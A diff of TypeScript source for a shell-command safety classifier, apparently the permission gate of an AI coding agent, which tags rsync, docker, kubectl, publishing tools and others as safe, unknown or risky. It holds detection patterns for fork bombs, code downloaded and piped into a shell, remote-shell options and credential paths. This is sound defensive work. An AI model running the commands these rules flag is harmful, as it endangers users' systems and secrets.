+    const valued = new Set(['-e', '--rsh', '--exclude', '--include', '--filter', '-f', '--exclude-from', '--include-from', '--files-from', '--chmod', '--chown', '--log-file', '--partial-dir', '--temp-dir', '-T', '--backup-dir', '--suffix', '--compare-dest', '--copy-dest', '--link-dest']);
+    if (args.some((arg) => /^(?:-e|--rsh)(?:=|$)/.test(arg.text))) return unknown('rsync runs a remote shell the rules do not check');
+    const operands = args.filter((arg, at) => !looksLikeOption(arg.text) && !(at > 0 && valued.has(args[at - 1]!.text)));
+    if (operands.length < 2) return unknownRead('rsync without a destination');
+    const destination = operands[operands.length - 1]!;
+    const deletes = words.some((word) => /^--(?:delete|del|delete-before|delete-during|delete-delay|delete-after|delete-excluded|remove-source-files)$/.test(word));
+    const effects = writesNamed([destination], state, context);
+    if (effects === undefined) return unknown('rsync copies files, to a place decided at run time or outside the project');
+    const written = effects.flatMap((effect) => (effect.verb === 'workspaceWrite' ? effect.paths : []));
+    if (deletes) return unknownRead('rsync copies files and deletes others', written.length > 0 ? destroyPaths(written) : undefined);
+    return unknownRead('rsync copies files', effects);
+  }
+  if (name === 'crontab') return words.length === 1 && words[0] === '-l' ? unknownRead('crontab -l') : risky('crontab changes scheduled jobs');
+  if (name === 'systemctl' || name === 'service' || name === 'launchctl') return words.some((word) => /^(?:start|stop|restart|reload|enable|disable|mask|unmask|kill|load|unload|bootstrap|bootout|daemon-reload)$/.test(word)) ? risky(`${name} changes system services`) : unknownRead(`${name}`);
   if (name === 'docker' || name === 'podman') {
-    if (['push', 'login', 'logout'].includes(words[0] ?? '') || (words[0] === 'image' && words[1] === 'push')) return risky(`${name} ${words[0]} changes a registry or your credentials`);
-    return unknown(`${name} ${words[0] ?? ''}`.trim());
+    // A push publishes an image; login and logout change your credentials and publish nothing (D-46).
+    const pushes = words[0] === 'push' || (words[0] === 'image' && words[1] === 'push');
+    if (['push', 'login', 'logout'].includes(words[0] ?? '') || (words[0] === 'image' && words[1] === 'push')) return risky(`${name} ${words[0]} changes a registry or your credentials`, pushes ? publishTo('container-registry') : undefined);
+    return unknownRead(`${name} ${words[0] ?? ''}`.trim());
   }
-  if (name === 'kubectl' || name === 'helm' || name === 'oc') return /^(?:apply|create|delete|replace|patch|rollout|scale|set|edit|exec|cp|drain|cordon|taint|label|annotate|install|upgrade|uninstall|rollback)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes a cluster`) : unknown(name);
-  if (name === 'terraform' || name === 'tofu' || name === 'pulumi' || name === 'cdk' || name === 'serverless' || name === 'sls') return /^(?:apply|destroy|import|up|deploy|remove|refresh|taint|untaint|state)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes deployed infrastructure`) : unknown(name);
+  if (name === 'kubectl' || name === 'helm' || name === 'oc') return /^(?:apply|create|delete|replace|patch|rollout|scale|set|edit|exec|cp|drain|cordon|taint|label|annotate|install|upgrade|uninstall|rollback)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes a cluster`, publishTo('deploy')) : unknownRead(name);
+  if (name === 'terraform' || name === 'tofu' || name === 'pulumi' || name === 'cdk' || name === 'serverless' || name === 'sls') return /^(?:apply|destroy|import|up|deploy|remove|refresh|taint|untaint|state)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes deployed infrastructure`, publishTo('deploy')) : unknownRead(name);
 /**
  * GitHub's read-only subcommands (0.4.18 review). A run waiting for CI polls `gh pr checks` and `gh pr view`, so those must not be a question every
  * time; nothing here writes. A flag that names another repository or a JSON field still only reads, and `gh api` keeps its own rule.
@@ -866,51 +1715,73 @@ const READ_ONLY_GH = new Set([
 
   if (name === 'gh' || name === 'glab') {
     const [group, action] = words.filter((word) => !looksLikeOption(word));
-    if (group === 'api') return words.some((word, at) => (word === '-X' || word === '--method') && !/^GET$/i.test(words[at + 1] ?? '')) || anyFlag(/^-(?:f|F)$|^--(?:field|raw-field|input)(?:=|$)/) ? risky(`${name} api changes data on GitHub`) : unknown(`${name} api`);
-    if (/^(?:create|edit|delete|merge|close|reopen|comment|review|upload|ready|lock|unlock|transfer|archive|rename|fork|sync|set|add|remove|enable|disable|run|cancel|rerun|login|logout|setup-git|refresh)$/.test(action ?? '') || group === 'release' && action !== 'list' && action !== 'view') return risky(`${name} ${group} ${action} changes data on GitHub`);
+    // Only release creation and its changes are publishing on the floor; other GitHub writes stay with the settings layer (D-46, an owner question).
+    const onReleases = words.some((word) => !looksLikeOption(word) && /(?:^|\/)releases(?:[/?]|$)/.test(word));
+    if (group === 'api') return words.some((word, at) => (word === '-X' || word === '--method') && !/^GET$/i.test(words[at + 1] ?? '')) || anyFlag(/^-(?:f|F)$|^--(?:field|raw-field|input)(?:=|$)/) ? risky(`${name} api changes data on GitHub`, onReleases ? publishTo('release') : undefined) : unknownRead(`${name} api`);
+    const releases = group === 'release' && /^(?:create|upload|edit|delete|delete-asset)$/.test(action ?? '');
+    if (/^(?:create|edit|delete|merge|close|reopen|comment|review|upload|ready|lock|unlock|transfer|archive|rename|fork|sync|set|add|remove|enable|disable|run|cancel|rerun|login|logout|setup-git|refresh)$/.test(action ?? '') || group === 'release' && action !== 'list' && action !== 'view') return risky(`${name} ${group} ${action} changes data on GitHub`, releases ? publishTo('release') : undefined);
     // 0.4.18 review: a run waiting for CI polls with exactly these, and the waiting guidance tells it to. Leaving them unknown would make every poll a
     // question in an asking mode, which is the wait the Check now button exists to end. They only read: no verb here writes to GitHub.
     if (name === 'gh' && READ_ONLY_GH.has(`${group ?? ''} ${action ?? ''}`.trim())) return safe(`${name} reads from GitHub and changes nothing`);
-    return unknown(`${name} ${group ?? ''} contacts GitHub`.trim());
+    return unknownRead(`${name} ${group ?? ''} contacts GitHub`.trim());
   }
   if (['vsce', 'ovsx', 'twine', 'gem', 'vercel', 'netlify', 'firebase', 'wrangler', 'fly', 'flyctl', 'heroku', 'semantic-release', 'release-it', 'np', 'gh-pages'].includes(name)) {
     const sub = words.find((word) => !looksLikeOption(word)) ?? '';
-    if (['vsce', 'ovsx'].includes(name) && !['publish', 'unpublish'].includes(sub)) return unknown(`${name} ${sub}`.trim());
-    if (name === 'gem' && sub !== 'push' && sub !== 'yank') return unknown(`gem ${sub}`.trim());
-    return risky(`${name} ${sub} publishes, releases, or deploys`.replace(/\s+/g, ' '));
+    if (['vsce', 'ovsx'].includes(name) && !['publish', 'unpublish'].includes(sub)) return unknownRead(`${name} ${sub}`.trim());
+    if (name === 'gem' && sub !== 'push' && sub !== 'yank') return unknownRead(`gem ${sub}`.trim());
+    return risky(`${name} ${sub} publishes, releases, or deploys`.replace(/\s+/g, ' '), publishTo(PUBLISH_TOOL_TARGETS[name] ?? 'release'));
   }
   if (name === 'cargo') {
     const sub = words.find((word) => !looksLikeOption(word)) ?? '';
-    if (['publish', 'yank', 'owner', 'login', 'logout'].includes(sub)) return risky(`cargo ${sub} changes crates.io`);
+    if (['publish', 'yank', 'owner', 'login', 'logout'].includes(sub)) return risky(`cargo ${sub} changes crates.io`, publishTo('registry'));
     if (['build', 'test', 'check', 'clippy', 'fmt', 'bench', 'doc', 'tree', 'metadata'].includes(sub) && !words.some((word) => /^--(?:manifest-path|target-dir|config|out-dir)(?:=|$)|^-Z$/.test(word))) return safe(`cargo ${sub} builds or tests the project`);
-    return unknown(`cargo ${sub}`.trim());
+    return unknownRead(`cargo ${sub}`.trim());
   }
   if (name === 'go') {
     const sub = words[0] ?? '';
     if (['test', 'build', 'vet', 'fmt', 'list', 'version', 'env'].includes(sub) && sub !== 'env' && !words.some((word) => /^-(?:o|exec|toolexec|modfile|overlay)(?:=|$)/.test(word))) { const reads = checkReads(args.slice(1).filter((arg) => !arg.text.startsWith('./...') && arg.text !== '...'), state, context, `go ${sub}`); return reads.verdict === 'safe' ? safe(`go ${sub} builds or tests the project`) : reads; }
-    return unknown(`go ${sub}`.trim());
+    return unknownRead(`go ${sub}`.trim());
   }
   if (name === 'make' || name === 'gmake') {
-    if (words.some((word) => /^-(?:C|f|I|-directory|-file|-makefile|-include-dir)(?:=|$)|^-[A-Za-z]*[CfI]$/.test(word))) return unknown('make with -C or -f runs another makefile');
+    // A release-like target is a publish whatever makefile it is in, so it is tagged before -C or -f is looked at (PR #74 review round 7).
+    const releaseTarget = words.find((word) => !looksLikeOption(word) && RELEASE_NAME.test(word));
+    if (words.some((word) => /^-(?:C|f|I|-directory|-file|-makefile|-include-dir)(?:=|$)|^-[A-Za-z]*[CfI]$/.test(word))) {
+      return releaseTarget ? risky(`make ${releaseTarget} looks like a publish, release, or deploy target`, publishTo('release')) : unknownRead('make with -C or -f runs another makefile');
+    }
     const target = words.find((word) => RELEASE_NAME.test(word) || /^(?:install|uninstall|clean|distclean)$/.test(word));
-    if (target) return RELEASE_NAME.test(target) ? risky(`make ${target} looks like a publish, release, or deploy target`) : unknown(`make ${target} may change files outside the workspace`);
-    if (words.some((word) => word.includes('='))) return unknown('make with variable overrides');
+    if (target) return RELEASE_NAME.test(target) ? risky(`make ${target} looks like a publish, release, or deploy target`, publishTo('release')) : unknownRead(`make ${target} may change files outside the workspace`);
+    if (words.some((word) => word.includes('='))) return unknownRead('make with variable overrides');
     return safe('make builds the project');
   }
   if (name === 'npm' || name === 'pnpm' || name === 'yarn' || name === 'bun') return program !== name ? unknown(`${program} is not the usual ${name}`) : classifyPackageManager(name, args, state, context, depth);
   if (name === 'npx' || (name === 'pnpm' && words[0] === 'dlx')) return classifyNpx(args, state, context, depth);
   if (name === 'git') return program !== 'git' ? unknown(`${program} is not the usual git`) : classifyGit(args, state, context);
-  if (name === 'near') return words.some((word) => /delete|deploy|send|transfer|sign|add-key|create-account|stake|call-function|as-transaction|tokens|import-account|export-account|login/i.test(word)) ? risky('near can sign transactions or change keys on NEAR') : unknown('near contacts the NEAR network');
-  if (name === 'aws' || name === 'gcloud' || name === 'az' || name === 'gsutil') return /^(?:cp|sync|mv|rm|rb|mb|put-object|delete|deploy|create|update|upload)/.test(words.slice(1).find((word) => !looksLikeOption(word)) ?? '') || words.some((word) => /^(?:deploy|delete|rm|cp|sync)$/.test(word)) ? risky(`${name} changes or uploads to cloud resources`) : unknown(name);
+  if (name === 'near') return words.some((word) => /delete|deploy|send|transfer|sign|add-key|create-account|stake|call-function|as-transaction|tokens|import-account|export-account|login/i.test(word)) ? risky('near can sign transactions or change keys on NEAR', publishTo('chain')) : unknownRead('near contacts the NEAR network');
+  if (name === 'aws' || name === 'gcloud' || name === 'az' || name === 'gsutil') return /^(?:cp|sync|mv|rm|rb|mb|put-object|delete|deploy|create|update|upload)/.test(words.slice(1).find((word) => !looksLikeOption(word)) ?? '') || words.some((word) => /^(?:deploy|delete|rm|cp|sync)$/.test(word)) ? risky(`${name} changes or uploads to cloud resources`, publishTo('deploy')) : unknownRead(name);
   if (name === 'xargs') {
     const inner = xargsCommand(args);
-    if (DELETERS.has(programName(inner[0]?.text ?? ''))) return risky(`xargs ${inner[0].text} deletes every file it is given`);
+    if (DELETERS.has(programName(inner[0]?.text ?? ''))) {
+      classifyWords(inner, state, context, depth + 1); // what it names itself (a protected file) is tagged too
+      return risky(`xargs ${inner[0].text} deletes every file it is given`, DESTROY_ALL);
+    }
     const result = classifyWords(inner, state, context, depth + 1);
-    return result.verdict === 'risky' ? risky(`xargs runs a risky command: ${result.reason}`) : unknown('xargs runs a command for every input line');
+    return result.verdict === 'risky' ? risky(`xargs runs a risky command: ${result.reason}`) : unknownRead('xargs runs a command for every input line');
   }
-  if (name === 'ln') return unknown('ln creates links, which can point outside the workspace');
-  if (name === 'export' || name === 'unset' || name === 'alias' || name === 'set' || name === 'shopt' || name === 'ulimit' || name === 'umask') return unknown(`${name} changes the shell session for later commands`);
+  if (name === 'ln') {
+    // The link is the last operand (or, with one operand, a link of the same name in the shell's folder); -t names its folder instead.
+    if (args.some((arg) => /^-(?:t|T)$|^--(?:target-directory|no-target-directory)(?:=|$)/.test(arg.text) || (looksLikeOption(arg.text) && !/^-[sfnrvbiLP]+$|^--(?:symbolic|force|no-dereference|relative|verbose|backup|interactive|logical|physical)$/.test(arg.text)))) {
+      return unknown('ln with an option the rules do not check');
+    }
+    const operands = args.filter((arg) => !looksLikeOption(arg.text) && arg.text !== '--');
+    if (operands.length === 0) return unknownRead('ln without a target');
+    const link = operands.length === 1 ? { ...operands[0]!, text: path.basename(operands[0]!.text) } : operands[operands.length - 1]!;
+    return writeResult('ln creates links, which can point outside the workspace', [link], state, context);
+  }
+  // An alias can make a later word on the line run anything, so the rest of the line is not read whole; the others only change settings.
+  if (name === 'alias') return unknown('alias makes a later word run another command');
+  if (name === 'export' || name === 'unset' || name === 'set' || name === 'shopt' || name === 'ulimit' || name === 'umask') return unknownRead(`${name} changes the shell session for later commands`);
   if (INTERPRETERS.has(name)) {
+    noteInlineScript(name, args, state, context, depth);
     if ((name === 'python' || name === 'python3') && words[0] === '-m' && ['pytest', 'unittest', 'mypy', 'ruff', 'black', 'flake8', 'pylint', 'isort'].includes(words[1] ?? '')) {
       const reads = checkReads(args.slice(2), state, context, `python -m ${words[1]}`);
       return reads.verdict === 'safe' ? safe(`python -m ${words[1]} tests or checks the project`) : reads;
@@ -940,20 +1811,45 @@ const READ_ONLY_GH = new Set([
         return reads.verdict === 'safe' ? safe('node --test runs the project\'s tests') : reads;
       }
     }
-    return unknown(`${name} runs code the rules cannot check`);
+    // The shell's own words were all read (a shell's -c script and eval are read by noteInlineScript). What a script file, or code written inline in
+    // another language (python -c, node -e), does once it runs is the documented gap: the rules read shell commands, not programs.
+    return unknownRead(`${name} runs code the rules cannot check`);
   }
   if ((name === 'sed' || name === 'gsed') && program === name) return classifySed(args, state, context);
   if ((name === 'awk' || name === 'gawk' || name === 'mawk') && program === name) return classifyAwk(args, state, context);
   if (DEV_TOOLS.has(name) && (viaNpx || program === name || isLocalBin(program, state, context))) {
-    if (name === 'tsx') return unknown('tsx runs a script');
+    if (name === 'tsx') return unknownRead('tsx runs a script');
     const outputs = words.some((word) => /^--(?:outDir|outFile|out-file|output-file|o|declarationDir|rootDir|tsBuildInfoFile|cache-location|config|resolve-plugins-relative-to|rulesdir|plugin|require|c)(?:=|$)|^-[oc]$/.test(word));
-    const reads = checkReads(args, state, context, name);
+    // Options that load code (a config, a plugin, a require) are not read; options that only name where output goes are writes to that place.
+    const loads = words.some((word) => /^--(?:config|resolve-plugins-relative-to|rulesdir|plugin|require|c)(?:=|$)|^-c$/.test(word));
+    const outputTargets: Word[] = [];
+    for (const [at, arg] of args.entries()) {
+      const match = /^(--(?:outDir|outFile|out-file|output-file|o|declarationDir|rootDir|tsBuildInfoFile|cache-location)|-o)(?:=(.*))?$/.exec(arg.text);
+      if (!match) continue;
+      const value = match[2] !== undefined ? { ...arg, text: match[2] } : args[at + 1];
+      if (value !== undefined) outputTargets.push(value);
+    }
+    const readArgs = args.filter((arg, at) => !outputTargets.includes(arg) && !(at > 0 && /^(?:--(?:outDir|outFile|out-file|output-file|o|declarationDir|rootDir|tsBuildInfoFile|cache-location)|-o)$/.test(args[at - 1]!.text)));
+    const reads = checkReads(readArgs, state, context, name);
     if (reads.verdict !== 'safe') return reads;
-    return outputs ? unknown(`${name} with an output, config, or plugin option`) : safe(`${name} builds, tests, or checks the project`);
+    if (!outputs) return safe(`${name} builds, tests, or checks the project`);
+    if (loads) return unknown(`${name} with a config or plugin option`);
+    return writeResult(`${name} writes its output`, outputTargets, state, context);
   }
   if (READ_ONLY.has(name) && program === name) {
-    if ((name === 'sort' && anyFlag(/^-o|^--output/)) || (name === 'printf' && words.includes('-v')) || (name === 'rg' && anyFlag(/^--pre(?:=|$)|^--pre-glob/))) return unknown(`${name} with an option that writes or runs programs`);
-    if (name === 'tail' && anyFlag(/^-[A-Za-z]*f/)) return unknown('tail -f does not finish');
+    if (name === 'rg' && anyFlag(/^--pre(?:=|$)|^--pre-glob/)) return unknown(`${name} with an option that writes or runs programs`);
+    // printf -v sets a shell variable: it writes no file.
+    if (name === 'printf' && words.includes('-v')) return unknownRead('printf -v sets a shell variable');
+    if (name === 'sort' && anyFlag(/^-o|^--output/)) {
+      const at = args.findIndex((arg) => /^-o|^--output/.test(arg.text));
+      const flag = args[at]!.text;
+      const inline = flag.startsWith('--output=') ? flag.slice(9) : /^-o.+/.test(flag) ? flag.slice(2) : undefined;
+      const target = inline !== undefined ? { ...args[at]!, text: inline } : args[at + 1];
+      if (target === undefined) return unknown('sort -o without a file');
+      const reads = checkReads(args.filter((arg, index) => index !== at && arg !== target), state, context, name, true);
+      return reads.verdict === 'safe' ? writeResult('sort writes its output to a file', [target], state, context) : reads;
+    }
+    if (name === 'tail' && anyFlag(/^-[A-Za-z]*f/)) return unknownRead('tail -f does not finish');
     return checkReads(args, state, context, name, true);
   }
   if (WORKSPACE_WRITERS.has(name) && program === name) {
@@ -964,12 +1860,35 @@ const READ_ONLY_GH = new Set([
       if (writes.verdict !== 'safe') return writes;
       const sources = name === 'mv' ? checkWrites(operands.slice(0, -1), state, context, 'mv') : checkReads(operands.slice(0, -1), state, context, 'cp');
       if (sources.verdict !== 'safe') return sources;
-      return operands.length >= 2 ? safe(`${name} only changes files inside the workspace`) : unknown(`${name} without a destination`);
+      return operands.length >= 2 ? safe(`${name} only changes files inside the workspace`) : unknownRead(`${name} without a destination`);
     }
     return checkWrites(args, state, context, name);
   }
-  if (name === 'cd') return unknown('cd'); // handled by the caller
-  return unknown(`${name} is not a command the rules know`);
+  if (name === 'cd') return unknownRead('cd'); // handled by the caller
+  // `if`, `then`, `{`, `exec` and the like: classifyWords has already read the words after them.
+  if (RUNS_WHAT_FOLLOWS.has(name)) return unknownRead(`${name} is not a command the rules know`);
+  return unknownProgram(name, args, state, context, depth);
+}
+
+/**
+ * A program the rules do not know: it may be a wrapper that runs the words after it (chronic, ionice, a project's own runner). Each later word that names a
+ * program the rules can tag is read from there; if what follows tags anything, the command's effects are unknown, so the gate asks rather than reading "no
+ * tag" (PR #74 review round 2). More candidates than MAX_RUNNER_PROBES are not each read: the effects are unknown then too.
+ */
+function unknownProgram(name: string, args: readonly Word[], state: SegmentState, context: CommandContext, depth: number, said?: string): CommandClassification {
+  const reason = said ?? `${name} is not a command the rules know`;
+  const candidates = args.flatMap((arg, index) => {
+    const candidate = programName(arg.text);
+    return !arg.expansion && !looksLikeOption(arg.text) && (TAGGED_PROGRAMS.has(candidate) || /^mkfs(?:\.|$)/.test(candidate)) ? [index] : [];
+  });
+  if (candidates.length > MAX_RUNNER_PROBES) return beyondReach(`${reason}, and too many of the words after it are commands to check`);
+  for (const index of candidates) {
+    const mark = effectMark();
+    classifyWords(args.slice(index), state, context, depth + 1);
+    if (effectsSince(mark).length > 0) return beyondReach(`${reason}, and it may run ${args.slice(index, index + 2).map((arg) => arg.text).join(' ')}`);
+  }
+  // Every word was probed: what it may run that the rules tag would have been found. The program itself is one the rules cannot judge.
+  return unknownRead(reason);
 }
 
 
@@ -1051,10 +1970,20 @@ function splitWords(text: string): string[] {
 
 function classifyText(command: string, context: CommandContext, depth: number): CommandClassification {
   const raw = command.trim();
-  if (!raw) return unknown('the command is empty');
-  if (depth > 4) return unknown('the command nests too deeply to check');
-  if (/:\(\)\s*\{/.test(raw)) return risky('it defines a fork bomb');
-  if (DOWNLOAD_TO_SHELL.test(raw)) return risky('it runs code downloaded from the network');
+  const deep = tooDeep(depth);
+  if (deep) return deep;
+  if (!raw) return unknownRead('the command is empty');
+  // These two decide the verdict on their own, but the rest of the command is still read, so what it publishes or destroys is seen (Pitfall 2).
+  const early = /:\(\)\s*\{/.test(raw) ? risky('it defines a fork bomb') : DOWNLOAD_TO_SHELL.test(raw) ? risky('it runs code downloaded from the network') : undefined;
+  const result = classifyStructure(raw, context, depth);
+  return early ?? result;
+}
+
+/**
+ * The verdict of a command line once the two whole-text checks have passed. The first verdict any part decides is the one returned, as it always was; the
+ * parts after it are still read, only so that every effect in the line is gathered.
+ */
+function classifyStructure(raw: string, context: CommandContext, depth: number): CommandClassification {
   // 0.4.18: Open-GSD also writes its prologue inline (cd to the project, export CLAUDE_CONFIG_DIR, GSD=<the managed gsd-tools>, then run it), which is
   // not the shipped block. When the runtime is verified trusted, its variables name known files, so the command is not opaque. This runs before the
   // preamble match so both forms reach the same checker.
@@ -1069,10 +1998,11 @@ function classifyText(command: string, context: CommandContext, depth: number): 
     const rest = raw.slice(preamble.length);
     const joined = /^[ \t]*(?:(?:\r?\n|;|&&)\s*)?/.exec(rest)?.[0] ?? '';
     if (!rest.trim() || joined.trim() || /[\r\n]/.test(joined)) {
-      if (!context.gsdRun?.trusted) return unknown(`it starts with the Open-GSD preamble, but ${context.gsdRun?.reason ?? 'the shell it would run in was not checked'}`);
       const remainder = rest.slice(joined.length).trim();
-      if (!remainder) return safe('it only runs the Open-GSD preamble, which picks the managed runtime\'s gsd-tools');
-      const inner = classifyText(remainder, { ...context, gsdRunDefined: true }, depth + 1);
+      // What follows the preamble is read for its effects even when the runtime was not checked: gsd_run is then read as the managed gsd-tools.
+      const inner = remainder ? classifyText(remainder, { ...context, gsdRunDefined: true }, depth + 1) : undefined;
+      if (!context.gsdRun?.trusted) return unknownRead(`it starts with the Open-GSD preamble, but ${context.gsdRun?.reason ?? 'the shell it would run in was not checked'}`);
+      if (!inner) return safe('it only runs the Open-GSD preamble, which picks the managed runtime\'s gsd-tools');
       return inner.verdict === 'safe' ? safe(`the Open-GSD preamble picks the managed runtime's gsd-tools, and ${inner.reason}`) : inner;
     }
   }
@@ -1083,80 +2013,106 @@ function classifyText(command: string, context: CommandContext, depth: number): 
     if (inner.verdict === 'risky') return risky(`a command inside a substitution is risky: ${inner.reason}`);
   }
   const lexed = lex(raw);
+  if (lexed.segments.reduce((total, segment) => total + segment.words.length, 0) > MAX_COMMAND_WORDS) return beyondReach('the command has too many words to check');
   if (lexed.broken) {
+    // Not parsed, so not read whole: its effects are unknown, whatever the verdict (PR #74 review round 8).
+    markUnread(`it has ${lexed.broken}`);
     if (SENSITIVE_TEXT.test(raw)) return risky('it names a credential or knowledge-base path');
     return unknown(`it has ${lexed.broken}`);
   }
   const findings: CommandClassification[] = [];
+  let decided: CommandClassification | undefined;
   for (const inner of lexed.substitutions) {
     const result = classifyText(inner, context, depth + 1);
-    if (result.verdict === 'risky') return risky(`a command inside a substitution is risky: ${result.reason}`);
+    if (result.verdict === 'risky') decided ??= risky(`a command inside a substitution is risky: ${result.reason}`);
   }
   const state: SegmentState = { cwd: context.cwd ?? context.root };
-  if (!isInside(context.root, state.cwd)) findings.push(unknown('the shell\'s working directory is outside the workspace'));
+  if (!isInside(context.root, state.cwd)) findings.push(unknownRead('the shell\'s working directory is outside the workspace'));
   for (const [at, segment] of lexed.segments.entries()) {
     // Pipes into an interpreter run whatever came down the pipe.
     const program = segment.words.find((word) => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(word.text));
     const name = program ? programName(program.text) : '';
+    noteRedirectWrites(segment.redirects, state, context);
     if ((segment.previous === '|' || segment.previous === '|&') && (INTERPRETERS.has(name) || (name === 'sudo' && segment.words.some((word) => INTERPRETERS.has(programName(word.text)))))) {
       const source = lexed.segments[at - 1];
       if (name === 'xargs') {
         // Skip xargs' own options; what follows is the command it runs for every line.
         const innerWords = xargsCommand(segment.words.slice(segment.words.indexOf(program!) + 1));
-        if (DELETERS.has(programName(innerWords[0]?.text ?? ''))) return risky(`xargs ${innerWords[0].text} deletes whatever comes down the pipe`);
+        if (DELETERS.has(programName(innerWords[0]?.text ?? ''))) {
+          decided ??= risky(`xargs ${innerWords[0].text} deletes whatever comes down the pipe`, DESTROY_ALL);
+          classifyWords(innerWords, state, context, depth + 1); // what it names itself (a protected file) is tagged too
+          continue;
+        }
         const inner = classifyWords(innerWords, state, context, depth + 1);
-        if (inner.verdict === 'risky') return risky(`xargs runs a risky command for every input line: ${inner.reason}`);
-        findings.push(unknown('xargs runs a command for every input line'));
+        if (inner.verdict === 'risky') { decided ??= risky(`xargs runs a risky command for every input line: ${inner.reason}`); continue; }
+        findings.push(unknownRead('xargs runs a command for every input line'));
         continue;
       }
-      return risky(`it pipes ${source?.words[0]?.text ?? 'output'} into ${name}, which runs it as code`);
+      decided ??= risky(`it pipes ${source?.words[0]?.text ?? 'output'} into ${name}, which runs it as code`);
+      // Its own words (`bash -c '…'`, `sudo …`) are still read for what they do.
+      classifyWords(segment.words, state, context, depth);
+      continue;
     }
     for (const redirect of segment.redirects) {
       if (redirect.op.endsWith('&') && redirect.target && /^[0-9-]+$/.test(redirect.target.text)) continue;
       const target = redirect.target;
-      if (!target) return unknown('a redirect has no target');
+      if (!target) { decided ??= unknown('a redirect has no target'); continue; }
       if (redirect.op === '<<' || redirect.op === '<<<') continue;
       if (target.expansion || target.glob) { findings.push(unknown('a redirect target is decided at run time')); continue; }
       const facts = pathFacts(target.text, state.cwd, context);
       const writes = redirect.op !== '<';
-      if (facts.sensitive) return risky(`it ${writes ? 'writes' : 'reads'} ${target.text}, which may hold credentials or knowledge-base keys`);
+      if (facts.sensitive) { decided ??= risky(`it ${writes ? 'writes' : 'reads'} ${target.text}, which may hold credentials or knowledge-base keys`); continue; }
       if (facts.device) continue;
-      if (writes && !facts.inside && !facts.scratch) return risky(`it writes ${target.text}, which is outside the workspace`);
-      if (writes && facts.protectedWrite) return risky(`it writes ${target.text}, inside .git, .planning/.near-ai or .near-ai (other than its scratch and attachments folders), where writes always ask`);
+      if (writes && !facts.inside && !facts.scratch) { decided ??= risky(`it writes ${target.text}, which is outside the workspace`); continue; }
+      if (writes && facts.protectedWrite) { decided ??= risky(`it writes ${target.text}, inside .git, .planning/.near-ai or .near-ai (other than its scratch and attachments folders), where writes always ask`); continue; }
       // A read of a temporary folder is scratch work: safe, and named as such in the reason (0.4.18).
-      if (!writes && !facts.inside && !facts.scratch) findings.push(unknown(`it reads ${target.text}, outside the workspace`));
+      if (!writes && !facts.inside && !facts.scratch) findings.push(unknownRead(`it reads ${target.text}, outside the workspace`));
     }
     if (!segment.words.length) continue;
-    if (segment.words.some((word) => !word.quoted && word.text.startsWith('~') && word.text !== '~' && !word.text.startsWith('~/'))) findings.push(unknown('it names another user\'s home directory'));
+    if (segment.words.some((word) => !word.quoted && word.text.startsWith('~') && word.text !== '~' && !word.text.startsWith('~/'))) findings.push(unknownRead('it names another user\'s home directory'));
     // Any word naming a credential or knowledge-base path, whatever the command.
     const secret = segment.words.find((word) => { const value = valuePart(word.text); return (value.includes('/') || value.startsWith('.') || value.startsWith('~') || /\.(?:kbkey|pem|key|p12|pfx|keystore)$|^state\.vscdb|^id_/.test(value)) && pathFacts(value, state.cwd, context).sensitive; });
-    if (secret) return risky(`it names ${secret.text}, which may hold credentials or knowledge-base keys`);
+    if (secret) decided ??= risky(`it names ${secret.text}, which may hold credentials or knowledge-base keys`);
     if (program && programName(program.text) === 'cd' && segment.words.indexOf(program) === 0) {
       const target = segment.words[1];
-      if (!target) { findings.push(unknown('cd with no directory goes to the home directory, outside the workspace')); state.cwd = context.home ?? '/'; continue; }
-      if (target.expansion || target.glob || target.text === '-' || segment.words.length > 2) { findings.push(unknown('cd to a directory decided at run time')); continue; }
+      if (lexed.subshell) state.cwdUnknown ??= 'it changes folder inside parentheses, so later parts may run in either folder';
+      if (!target) { findings.push(unknownRead('cd with no directory goes to the home directory, outside the workspace')); state.cwd = context.home ?? '/'; continue; }
+      if (target.expansion || target.glob || target.text === '-' || segment.words.length > 2) { findings.push(unknown('cd to a directory decided at run time')); state.cwdUnknown ??= 'it changes to a folder decided at run time'; continue; }
       // Owner decision 2026-11-05 (0.4.17): a cd inside the workspace is part of ordinary work, so it is safe and does not make the whole
       // command unknown; a cd that leaves the workspace still asks.
       const facts = pathFacts(target.text, state.cwd, context);
       // A cd into the system's temporary folder is accepted scratch work (0.4.18): Open-GSD's workflows run helper scripts from /tmp.
-      if (!facts.inside && !facts.scratch) findings.push(unknown(`cd ${target.text} leaves the workspace`));
+      if (!facts.inside && !facts.scratch) findings.push(unknownRead(`cd ${target.text} leaves the workspace`));
       state.cwd = facts.absolute;
       continue;
     }
+    // pushd moves the folder as cd does and popd moves it back to one this line may not show: the verdict is the rules' own, the folder is followed.
+    if (program && segment.words.indexOf(program) === 0 && (programName(program.text) === 'pushd' || programName(program.text) === 'popd')) {
+      const target = segment.words[1];
+      if (lexed.subshell) state.cwdUnknown ??= 'it changes folder inside parentheses, so later parts may run in either folder';
+      if (programName(program.text) === 'popd' || target === undefined || target.expansion || target.glob || segment.words.length > 2 || /^[+-]\d*$/.test(target.text)) state.cwdUnknown ??= `${program.text} moves to a folder this line does not show`;
+      else state.cwd = pathFacts(target.text, state.cwd, context).absolute;
+    }
     // A part the user put on their allow list runs as is (the deny list is checked before this).
     const plain = segment.words.every((word) => !word.expansion && !word.glob && (!word.quoted || /^[\w.\/:=@+,%-]+$/.test(word.text)));
-    if (plain && context.isAllowListed?.(segment.words.map((word) => word.text).join(' '))) { findings.push(safe(`${segment.words.slice(0, 2).map((word) => word.text).join(' ')} is on your allow list`)); continue; }
+    if (plain && context.isAllowListed?.(segment.words.map((word) => word.text).join(' '))) {
+      findings.push(safe(`${segment.words.slice(0, 2).map((word) => word.text).join(' ')} is on your allow list`));
+      // The allow list decides the verdict, never what the floor sees: the part is still read for its effects.
+      classifyWords(segment.words, state, context, depth);
+      continue;
+    }
     const result = classifyWords(segment.words, state, context, depth);
-    if (result.verdict === 'risky') return result;
+    if (result.verdict === 'risky') { decided ??= result; continue; }
     const wild = segment.words.find((word) => word.glob && !isWorkspaceGlob(word, state, context));
-    if (wild) findings.push(unknown(`it uses a wildcard (${wild.text}) that may match files outside the workspace`));
+    if (wild) findings.push(unknownRead(`it uses a wildcard (${wild.text}) that may match files outside the workspace`));
